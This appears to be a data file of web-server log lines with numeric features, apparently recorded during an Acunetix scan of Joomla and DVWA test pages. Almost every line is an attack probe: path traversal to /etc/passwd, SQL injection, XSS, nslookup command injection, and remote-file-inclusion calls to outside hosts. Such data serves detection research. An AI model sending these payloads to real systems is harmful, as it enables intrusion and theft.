167,3,200,3223,7,70,56,30,1,GET /index.php/component/search/?ordering=alpha&searchphrase=all&searchword=../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd HTTP/1.1
91,1,404,531,7,36,25,15,1,GET /../../../../../../../../../../etc/passwd%00.php/2-uncategorised/1-testsayfasi HTTP/1.1
122,3,200,3232,9,65,18,5,0,GET /index.php/component/search/?ordering=alpha&searchphrase=all&searchword=-1%20OR%203%2b456-456-1=0%2b0%2b0%2b1 HTTP/1.1
87,1,404,562,13,54,6,7,1,GET /WEB-INF%5cweb.xml/component/content/article/2-uncategorised/1-testsayfasi HTTP/1.1
93,1,200,2807,15,37,18,6,1,POST /index.php/component/users/?task='\"()%26%25<acx><ScRiPt%20>y3iC(9850)</ScRiPt> HTTP/1.1
124,3,200,1855,7,61,12,5,1,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=%f0''%f0\"\"&tmpl=component HTTP/1.1
45,1,404,522,8,27,2,4,1,GET /jboss-net/services/listServices HTTP/1.1
90,1,404,582,7,50,12,5,1,GET /index.php<img/src=\">\"%20onerror=alert(9165)>/2-uncategorised/1-testsayfasi HTTP/1.1
163,1,302,384,11,87,42,5,1,GET /DVWA/security.php?phpids=(select(0)from(select(sleep(2)))v)/*'%2b(select(0)from(select(sleep(2)))v)%2b'\"%2b(select(0)from(select(sleep(2)))v)%2b\"*/ HTTP/1.1
64,1,200,3475,10,34,5,6,0,GET /index.php/component/content/category/2-%40%40DEYej HTTP/1.1
32,1,404,509,7,15,2,4,1,GET /admin/pma/main.php HTTP/1.1
91,3,200,3105,7,65,8,7,1,GET /index.php/component/search/?ordering=/etc/passwd&searchphrase=any&searchword= HTTP/1.1
94,1,200,3529,9,34,17,6,1,GET /index.php/component/content/category/2--1\"%20OR%203*2>(0%2b5%2b788-788)%20--%20 HTTP/1.1
33,1,404,510,7,13,4,2,1,GET /192-database.tar.gz HTTP/1.1
41,1,404,518,7,24,2,4,1,GET /computing/robots/check.html HTTP/1.1
96,3,200,3148,10,62,10,5,0,GET /index.php/component/search/?ordering=alpha&searchphrase=all&searchword=%40%404DOwW HTTP/1.1
56,2,500,1983,7,32,8,2,1,GET /index.php?format=feed&type=set%7cset%26set HTTP/1.1
35,1,200,3367,7,12,4,6,0,GET ////vulnweb.com/%2e%2e HTTP/1.1
143,4,200,3266,10,88,24,5,1,GET /index.php/component/search/?searchword=ul.menu\"%20p0uF=kzsy([!%20!])%20MNw=\"&ordering=popular&searchphrase=all&areas[0]=content HTTP/1.1
107,1,200,3300,9,50,14,7,0,GET /index.php/-1%20OR%202%2b658-658-1=0%2b0%2b0%2b1/content/article/2-uncategorised/1-testsayfasi HTTP/1.1
78,3,500,1983,7,50,12,5,1,GET /index.php/component/content/?format=feed&type=<!--&view=featured HTTP/1.1
116,3,200,3140,8,83,12,9,0,GET /index.php/component/search/?ordering=Http://testasp.vulnweb.com/t/fit.txt&searchphrase=any&searchword= HTTP/1.1
95,1,404,565,7,33,26,21,1,GET /index.php/2-uncategorised/1-/../..//../..//../..//../..//../..//etc/passwd%00.jpg HTTP/1.1
24,1,404,501,7,5,2,2,1,GET /192_db.sql HTTP/1.1
104,4,200,3163,7,66,16,5,1,GET /index.php/component/search/?searchword='\"()&%kzsy(9641)=&ordering=oldest&searchphrase=any HTTP/1.1
127,3,200,3151,7,87,18,5,1,GET /index.php/component/search/?ordering=';print(md5(acunetix_wvs_security_test));%24a='&searchphrase=any&searchword= HTTP/1.1
51,1,200,2757,7,31,4,5,0,GET /index.php/component/users/?view=login HTTP/1.1
34,1,404,511,7,17,2,4,1,GET /admin/mysql/main.php HTTP/1.1
119,4,200,3184,7,82,13,5,0,GET /index.php/component/search/?searchword=ul.menu9385804&ordering=alpha&searchphrase=all&areas[0]=categories HTTP/1.1
99,1,400,485,7,32,34,20,1,GET /index.php/2-uncategorised/1-../../../../../../../../../../../../../../../proc/version HTTP/1.1
42,2,500,2045,7,22,7,2,1,GET /index.php?format=)&type=atom HTTP/1.1
37,1,200,2063,7,19,2,5,0,GET /media/system/js/core.js HTTP/1.1
115,3,500,2105,7,75,14,5,1,GET /index.php/component/content/?format=feed&type=rss&view=%24{%40print(md5(acunetix_wvs_security_test))} HTTP/1.1
110,1,404,595,19,47,12,6,1,GET /index.php\"%20AND%202*3*8=6*8%20AND%20\"UcVI\"=\"UcVI/component/content/category/2-uncategorised HTTP/1.1
88,3,200,3094,7,60,12,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=<!--&searchword= HTTP/1.1
90,3,200,3148,7,62,12,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword=<!-- HTTP/1.1
93,1,302,384,11,24,29,21,1,GET /DVWA/security.php?test=/.././.././.././.././.././.././.././../etc/./passwd%2500 HTTP/1.1
69,1,500,2047,9,39,5,6,1,GET /index.php/component/content/%40%40on5TR/2-uncategorised HTTP/1.1
154,4,200,3287,23,84,22,5,0,GET /index.php/component/search/?searchword=acu9247%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca9247&ordering=alpha&searchphrase=any&areas[0]=newsfeeds HTTP/1.1
4130,2,500,1983,7,38,2047,2034,1,GET /index.php?format=feed&type=invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././. HTTP/1.1
225,1,404,3988,7,102,44,8,1,GET /index.php/component/content/category/2-(select(0)from(select(sleep(4.156000000000001)))v)/*'%2b(select(0)from(select(sleep(4.156000000000001)))v)%2b'\"%2b(select(0)from(select(sleep(4.156000000000001)))v)%2b\"*/ HTTP/1.1
155,4,200,3288,23,85,22,5,0,GET /index.php/component/search/?searchword=acu9572%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca9572&ordering=popular&searchphrase=any&areas[0]=weblinks HTTP/1.1
134,4,200,3196,13,95,12,5,1,GET /index.php/component/search/?searchword=the&ordering=newest&searchphrase=exact&areas[0]=categoriesacxScRiPtkzsy9382ScRiPt HTTP/1.1
90,3,200,3146,7,64,10,5,0,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword[]= HTTP/1.1
114,3,200,1524,7,67,20,4,1,GET /index.php/2-uncategorised/1-testsayfasi?page=-1;select%20pg_sleep(6);%20--%20&print=1&tmpl=component HTTP/1.1
143,4,200,3276,11,86,24,5,1,GET /index.php/component/search/?searchword=ul.menu\"%209FXe=kzsy([!%20!])%20TN5=\"&ordering=oldest&searchphrase=any&areas[0]=weblinks HTTP/1.1
159,3,200,338,13,69,21,5,1,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=beez_20&tmpl=component'%20AND%202*3*8=6*8%20AND%20'2rki'='2rki HTTP/1.1
70,1,200,237,8,46,7,5,0,POST /index.php/component/users/?task[]=registration.register HTTP/1.1
129,1,200,2781,8,35,52,30,1,POST /index.php/component/users/?task=../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd HTTP/1.1
46,1,200,3278,7,21,5,4,1,GET /index.php/2-uncategorised/1-1'\" HTTP/1.1
57,2,500,2069,13,28,9,2,1,GET /index.php?format=WEB-INF%5cweb.xml&type=rss HTTP/1.1
104,4,200,3130,7,75,12,5,0,GET /index.php/component/search/?searchword=&ordering=oldest&searchphrase=all&areas[0]=weblinks HTTP/1.1
137,3,500,2063,7,70,32,12,1,GET /index.php/component/content/?format=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd&type=rss&view=featured HTTP/1.1
93,1,302,384,11,30,26,20,1,GET /DVWA/instructions.php?doc=/../..//../..//../..//../..//../..//etc/passwd%00.jpg HTTP/1.1
129,4,200,3185,13,94,12,5,1,GET /index.php/component/search/?searchword=the&ordering=newestacxScRiPtkzsyScRiPt&searchphrase=exact&areas[0]=newsfeeds HTTP/1.1
81,1,404,3995,7,45,10,5,1,GET /index.php/\";print(md5(acunetix_wvs_security_test));%24a=\"/search/ HTTP/1.1
72,1,404,3993,7,46,5,6,1,GET /index.php/set%7cset%26set/content/category/2-uncategorised HTTP/1.1
74,3,200,1101,7,50,8,5,0,GET /index.php/component/content/?format=feed&type=&view=featured HTTP/1.1
94,3,200,3156,7,62,8,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=all&searchword=19647541 HTTP/1.1
101,1,200,3529,7,65,11,8,1,GET /index.php/2-uncategorised/http://testasp.vulnweb.com/t/xss.html%3f%2500.jpg-testsayfasi HTTP/1.1
132,3,200,3266,12,77,21,5,1,GET /index.php/component/search/?ordering=newest&searchphrase=all&searchword=IgkTIWyG';%20waitfor%20delay%20'0:0:4'%20--%20 HTTP/1.1
77,1,500,2043,7,48,6,7,1,GET /index.php/component/content/248''/2-uncategorised/1-testsayfasi HTTP/1.1
4201,3,200,1854,7,84,2049,2037,1,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=invalid../../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.&tmpl=component HTTP/1.1
124,3,200,3227,13,75,13,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword=acux8209%C0%BEz1%C0%BCz2a%90bcxuca8209 HTTP/1.1
133,3,200,3142,7,91,15,5,1,GET /index.php/component/search/?ordering=popular&searchphrase=%24{%40print(md5(acunetix_wvs_security_test))}%5c&searchword= HTTP/1.1
121,3,200,1524,9,56,25,4,1,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=-1'%20OR%203*2<(0%2b5%2b564-564)%20--%20&tmpl=component HTTP/1.1
145,1,404,570,14,57,53,4,1,GET /theme/META-INF%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini HTTP/1.1
98,1,500,2081,15,37,20,5,1,GET /index.php/component/users/?view=login%25'%20AND%202*3*8=6*8%20AND%20'Yyte'!='Yyte%25 HTTP/1.1
80,2,500,1983,7,37,14,2,1,GET /index.php?format=feed&type='%2bresponse.write(9924438*9597749)%2b' HTTP/1.1
153,3,200,1854,10,85,20,5,1,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=GZuafL1g'));select%20pg_sleep(6);%20--%20&tmpl=component HTTP/1.1
127,3,500,1983,7,66,29,14,1,GET /index.php/component/content/?format=feed&type=/%5c../%5c../%5c../%5c../%5c../%5c../%5c../etc/passwd&view=featured HTTP/1.1
164,3,200,3114,7,67,56,30,1,GET /index.php/component/search/?ordering=alpha&searchphrase=../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd&searchword= HTTP/1.1
78,1,500,2043,7,27,24,5,1,GET /index.php/component/users/?view=%5e(%23%24!%40%23%24)(()))****** HTTP/1.1
94,3,200,1730,13,58,10,6,0,GET /index.php/component/mailto/?link=WEB-INF/web.xml&template=beez_20&tmpl=component HTTP/1.1
81,3,500,2061,10,54,8,5,1,GET /index.php/component/content/?format=mxdOplJQ&type=rss&view=featured HTTP/1.1
92,1,200,2791,10,30,18,5,0,POST /index.php/component/users/?task=-1%20OR%203%2b729-729-1=0%2b0%2b0%2b1%20--%20 HTTP/1.1
126,3,200,338,7,67,10,6,0,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=beez_20&tmpl=/www.vulnweb.com HTTP/1.1
120,3,200,3242,7,76,18,5,1,GET /index.php/component/search/?ordering=popular&searchphrase=all&searchword=-1;select%20pg_sleep(12);%20--%20 HTTP/1.1
117,3,500,2091,15,59,21,5,1,GET /index.php/component/content/?format=feed&type=rss&view=featured'%20AND%202*3*8=6*8%20AND%20'vmBi'='vmBi HTTP/1.1
17,1,301,571,7,3,1,2,0,GET /cli HTTP/1.1
119,3,200,1752,7,72,8,5,0,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=beez_20&tmpl=component HTTP/1.1
87,1,500,2049,13,54,6,8,1,GET /index.php/component/content/WEB-INF/web.xml/2-uncategorised/1-testsayfasi HTTP/1.1
140,4,200,3268,7,99,16,5,1,GET /index.php/component/search/?searchword=ul.menu\"onmouseover=kzsy(9965)\"&ordering=popular&searchphrase=any&areas[0]=categories HTTP/1.1
151,3,500,2177,8,111,14,8,1,GET /index.php/component/content/?format=http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.jpg&type=atom&view=featured HTTP/1.1
174,3,200,338,7,75,32,12,1,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=beez_20&tmpl=.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./.%5c%5c./etc/passwd HTTP/1.1
150,3,200,338,10,79,19,5,1,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=beez_20&tmpl=BLl6tw4Q');select%20pg_sleep(2);%20--%20 HTTP/1.1
56,1,200,3279,7,32,5,4,1,GET /index.php/1'\"-uncategorised/1-testsayfasi HTTP/1.1
119,3,200,3132,9,73,18,5,1,GET /index.php/component/search/?ordering=47jJilkL';select%20pg_sleep(3);%20--%20&searchphrase=any&searchword= HTTP/1.1
135,3,200,3219,7,76,30,16,1,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword=../../../../../../../../../../etc/passwd%00.jpg HTTP/1.1
103,3,500,1983,9,66,11,8,1,GET /index.php/component/content/?format=feed&type=http://hit0tE047xHp4.bxss.me/&view=featured HTTP/1.1
121,3,200,3257,7,85,12,5,1,GET /index.php/component/search/?searchword=ul.menu\"onmouseover=kzsy(9655)\"&ordering=category&searchphrase=all HTTP/1.1
102,3,200,3170,7,75,10,6,0,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword=/www.vulnweb.com HTTP/1.1
131,3,200,3208,17,70,22,6,1,GET /index.php/component/search/?ordering=alpha&searchphrase=all&searchword='\"()%26%25<acx><ScRiPt%20>RBUT(9459)</ScRiPt> HTTP/1.1
128,3,200,1854,7,81,10,6,0,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=/www.vulnweb.com&tmpl=component HTTP/1.1
134,3,200,1854,7,71,20,5,0,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=!(()%26%26!%7c*%7c*%7c&tmpl=component HTTP/1.1
120,3,200,3237,7,77,18,5,1,GET /index.php/component/search/?ordering=category&searchphrase=all&searchword=-1;select%20pg_sleep(6);%20--%20 HTTP/1.1
114,1,404,3986,8,82,8,11,1,GET /index.php/component/content/article/2-uncategorised/Http://testasp.vulnweb.com/t/fit.txt-testsayfasi HTTP/1.1
61,1,200,3474,11,36,3,6,0,GET /index.php/component/content/category/2-LMrcfgNP HTTP/1.1
31,1,404,508,7,15,1,4,1,GET /admin/phpmyadmin/ HTTP/1.1
77,1,500,2063,7,48,5,6,1,GET /index.php/component/content/%252fetc%252fpasswd/2-uncategorised HTTP/1.1
153,3,200,338,8,94,14,9,0,GET /index.php/component/mailto/?link=90ed7f9d717b47dafcf4b4c1bb9de7c57b1fb587&template=beez_20&tmpl=http://testasp.vulnweb.com/t/fit.txt%3F.jpg HTTP/1.1
88,1,200,2798,12,41,16,5,1,POST /index.php/component/users/?task=tR8CX6jB'));select%20pg_sleep(4);%20--%20 HTTP/1.1
90,1,404,557,9,41,16,4,1,GET /bq3abQAf';%20waitfor%20delay%20'0:0:2'%20--%20/2-uncategorised/1-testsayfasi HTTP/1.1
122,4,200,3205,7,74,13,5,1,GET /index.php/component/search/?searchword={{9999364*9999776}}&ordering=alpha&searchphrase=any&areas[0]=contacts HTTP/1.1
125,1,404,3989,15,66,12,6,1,GET /index.php/component/content/category/%26nslookup%209ZcO2HwE%26'%5c\"`0%26nslookup%209ZcO2HwE%26`'-uncategorised HTTP/1.1
70,2,500,2085,10,39,9,5,1,GET /index.php?format=http://hitknOaz89C0Q.bxss.me/&type=atom HTTP/1.1
86,3,200,1524,7,54,11,4,1,GET /index.php/2-uncategorised/1-testsayfasi?page=1'\"&print=1&tmpl=component HTTP/1.1
121,1,302,384,11,26,52,28,1,GET /DVWA/security.php?phpids=../.../.././../.../.././../.../.././../.../.././../.../.././../.../.././etc/passwd HTTP/1.1
126,4,200,3184,13,91,12,5,1,GET /index.php/component/search/?searchword=the&ordering=oldest&searchphrase=allacxScRiPtkzsyScRiPt&areas[0]=weblinks HTTP/1.1
19,1,200,312,7,4,1,3,0,GET /logs/ HTTP/1.1
225,1,200,3347,17,19,41,4,0,GET /index.php/2-%2575%256E%2563%2561%2574%2565%2567%256F%2572%2569%2573%2565%2564%2522%256F%256E%256D%256F%2575%2573%2565%256F%2576%2565%2572%253D%256E%257A%2552%2561%2528%2539%2536%2536%2539%2529%2522/1-testsayfasi HTTP/1.1
118,3,200,3159,7,63,28,5,0,GET /index.php/component/search/?ordering=oldest&searchphrase=any&searchword=%5e(%23%24!%40%23%24)(()))****** HTTP/1.1
205,3,200,1855,18,71,41,5,0,GET /index.php/component/mailto/?link=0011f090d89f910f3d24e9873575a8d16029ca3e&template=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg&tmpl=component HTTP/1.1
109,3,200,3175,7,66,20,5,0,GET /index.php/component/search/?ordering=popular&searchphrase=all&searchword=!(()%26%26!%7c*%7c*%7c HTTP/1.1
86,1,200,2777,13,41,14,5,1,POST /index.php/component/users/?task=rD7LLCWz';select%20pg_sleep(6);%20--%20 HTTP/1.1
132,3,200,3223,17,71,22,6,1,GET /index.php/component/search/?ordering=newest&searchphrase=any&searchword='\"()%26%25<acx><ScRiPt%20>RBUT(9838)</ScRiPt> HTTP/1.1
107,4,200,3125,7,78,12,5,0,GET /index.php/component/search/?searchword=&ordering=category&searchphrase=all&areas[0]=newsfeeds HTTP/1.1
32,1,404,508,7,16,2,3,1,GET //registration.html HTTP/1.1
113,3,200,3088,7,63,15,5,0,GET /index.php/component/search/?ordering=newest&searchphrase=1%00%c0%a7%c0%a2%252527%252522&searchword= HTTP/1.1
126,3,200,1729,7,64,30,16,1,GET /index.php/component/mailto/?link=../../../../../../../../../../etc/passwd%00.jpg&template=beez_20&tmpl=component HTTP/1.1
94,1,302,384,11,26,34,19,1,GET /DVWA/security.php?test=../../../../../../../../../../../../../../../proc/version HTTP/1.1
123,3,200,3142,7,89,14,5,1,GET /index.php/component/search/?ordering=newest&searchphrase=;print(md5(acunetix_wvs_security_test));&searchword= HTTP/1.1
61,1,302,384,17,25,8,3,0,GET /DVWA/security.php?test=%24(nslookup%20XLlAYwBG) HTTP/1.1
25,1,404,503,7,10,2,2,1,GET /server-info HTTP/1.1
50,2,500,2061,7,30,7,2,1,GET /index.php?format=index.php&type=atom HTTP/1.1
130,4,200,3161,13,91,12,5,1,GET /index.php/component/search/?searchword=&ordering=popular&searchphrase=all&areas[0]=categoriesacxScRiPtkzsy9593ScRiPt HTTP/1.1
123,4,200,3207,7,85,15,5,1,GET /index.php/component/search/?searchword=ul.menu\"kzsy(9495)&ordering=newest&searchphrase=all&areas[0]=contacts HTTP/1.1
46,1,200,3275,7,21,5,4,1,GET /index.php/2-uncategorised/1-745' HTTP/1.1
89,2,404,514,13,59,9,3,1,GET /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type%3DServer HTTP/1.1
15,1,500,1924,8,0,1,2,1,POST / HTTP/1.1
25,1,404,502,7,5,3,2,1,GET /192-dump.7z HTTP/1.1
162,3,500,2147,18,57,41,5,1,GET /index.php/component/content/?format=feed&type=rss&view=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.jpg HTTP/1.1
66,1,302,384,16,31,7,6,1,GET /DVWA/security.php?test=http://hityOFNMx4mK9.bxss.me/ HTTP/1.1
105,3,200,3177,7,72,11,5,1,GET /index.php/component/search/?searchword=ul.menu\"kzsy(9600)&ordering=oldest&searchphrase=all HTTP/1.1
86,1,302,383,11,29,26,14,1,GET /DVWA/security.php?phpids=../../../../../../../../../../etc/passwd%00.jpg HTTP/1.1
40,1,404,517,7,23,3,3,1,GET /cgi-sys/domainredirect.cgi HTTP/1.1
154,4,200,3294,23,84,22,5,0,GET /index.php/component/search/?searchword=acu9991%EF%BC%9Cs1%EF%B9%A5s2%CA%BAs3%CA%B9uca9991&ordering=newest&searchphrase=any&areas[0]=contacts HTTP/1.1
167,1,301,877,11,91,41,6,1,GET /DVWA/vulnerabilities/fi?page=(select(0)from(select(sleep(2)))v)/*'%2b(select(0)from(select(sleep(2)))v)%2b'\"%2b(select(0)from(select(sleep(2)))v)%2b\"*/ HTTP/1.1
89,3,200,3093,9,62,9,5,0,GET /index.php/component/search/?ordering=category&searchphrase=JyI=&searchword= HTTP/1.1
112,1,200,3534,19,53,13,4,1,GET /index.php/2-uncategorised/%26nslookup%20uTPwZSUU%26'%5c\"`0%26nslookup%20uTPwZSUU%26`'-testsayfasi HTTP/1.1
65,1,301,667,11,24,15,4,0,GET /DVWA/vulnerabilities/fi?page=!(()%26%26!%7c*%7c*%7c HTTP/1.1
41,1,500,1924,8,23,2,4,1,POST /index.php/component/search HTTP/1.1
158,3,200,1523,8,115,16,7,0,GET /index.php/2-uncategorised/1-testsayfasi?page=&print=http://some-inexistent-website.acu/some_inexistent_file_with_long_name%3F.jpg&tmpl=component HTTP/1.1
119,1,404,559,7,60,26,18,1,GET /index.php/component/content/../../../../../../../../../../etc/passwd%00.jpg/2-uncategorised/1-testsayfasi HTTP/1.1
109,1,400,485,7,43,34,20,1,GET /index.php/../../../../../../../../../../../../../../../proc/version-uncategorised/1-testsayfasi HTTP/1.1
131,5,200,3202,7,87,21,5,1,GET /index.php/component/search/?searchword=ul.menu'\"()&%kzsy(9070)=&ordering=category&searchphrase=any&areas[0]=weblinks HTTP/1.1
63,1,500,2061,13,33,7,5,1,GET /index.php/component/users/?view=WEB-INF%5cweb.xml HTTP/1.1
124,4,200,3147,13,89,12,5,1,GET /index.php/component/search/?searchword=&ordering=newestacxScRiPtkzsyScRiPt&searchphrase=exact&areas[0]=content HTTP/1.1
80,1,500,2077,21,32,13,6,1,GET /index.php/component/users/?view=login<W9DTAR>E5VAQ[!%2b!]</W9DTAR> HTTP/1.1
125,4,200,3209,7,76,13,5,1,GET /index.php/component/search/?searchword={{9999032*10000133}}&ordering=popular&searchphrase=all&areas[0]=contacts HTTP/1.1
98,1,500,2099,13,49,14,6,1,GET /index.php/component/users/?view=login%26lt;ScRiPt%26gt;Uqla(9380)%26lt;/sCripT%26gt; HTTP/1.1
125,3,200,3248,7,73,21,5,1,GET /index.php/component/search/?ordering=alpha&searchphrase=all&searchword=-1;%20waitfor%20delay%20'0:0:15'%20--%20 HTTP/1.1
51,2,500,2045,7,22,10,2,1,GET /index.php?format=60-0-0-0-0&type=atom HTTP/1.1
